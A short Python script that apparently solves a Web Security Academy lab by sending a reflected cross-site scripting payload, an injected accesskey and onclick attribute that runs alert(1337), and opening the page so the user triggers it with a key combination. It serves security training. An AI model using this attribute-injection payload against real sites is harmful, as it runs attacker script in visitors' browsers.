import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = '%27accesskey=%27x%27onclick=%27alert(1337)'
final_url = f"{base_url}?{payload}"

response = requests.get(url=final_url)


print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print("**press **Alt + Shift + X** To Solve the Challenge")
    print("   (For Linux, press **Alt + X**):\n")
    print(response.url)
    webbrowser.open(response.url)
else:
    print("Something went wrong.")